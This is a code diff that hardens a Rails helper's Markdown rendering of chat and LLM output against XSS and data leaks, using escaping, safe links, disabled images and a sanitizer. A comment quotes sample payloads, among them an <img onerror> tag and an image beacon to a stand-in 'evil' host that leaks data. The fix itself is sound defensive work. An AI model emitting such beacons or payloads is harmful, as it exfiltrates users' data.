@@ -130,12 +130,22 @@ module ApplicationHelper
     Chat.default_model
   end
 
-  # Renders Markdown text using Redcarpet
+  # Renders Markdown text using Redcarpet.
+  #
+  # Security (S1 / audit 06-H1): chat content can come from the assistant's
+  # LLM output (and, for user messages, straight from the user), so this is
+  # user-influenced content rendered as HTML. escape_html neutralizes raw
+  # HTML tags (e.g. <img onerror=...>, <script>), safe_links_only strips
+  # javascript:/data: link schemes, and no_images disables Markdown image
+  # syntax entirely (no auto-loading ![](https://evil/?d=leak) beacons).
+  # Rails::HTML5::SafeListSanitizer is a second layer in case any raw HTML
+  # slips through before we mark the result html_safe.
   def markdown(text)
     return "" if text.blank?
 
     renderer = Redcarpet::Render::HTML.new(
       hard_wrap: true,
+      escape_html: true,
       link_attributes: { target: "_blank", rel: "noopener noreferrer" }
     )
 
@@ -149,10 +159,18 @@ module ApplicationHelper
       underline: true,
       highlight: true,
       quote: true,
-      footnotes: true
+      footnotes: true,
+      safe_links_only: true,
+      no_images: true
     )
 
-    markdown.render(text).html_safe
+    sanitized = Rails::HTML5::SafeListSanitizer.new.sanitize(
+      markdown.render(text),
+      tags: %w[p br strong em b i u s strike del ins a ul ol li blockquote pre code table thead tbody tr th td sup sub hr h1 h2 h3 h4 h5 h6],
+      attributes: %w[href target rel]
+    )
+
+    sanitized.html_safe
   end
 
   # Generate the callback URL for Enable Banking OAuth (used in views and controller).
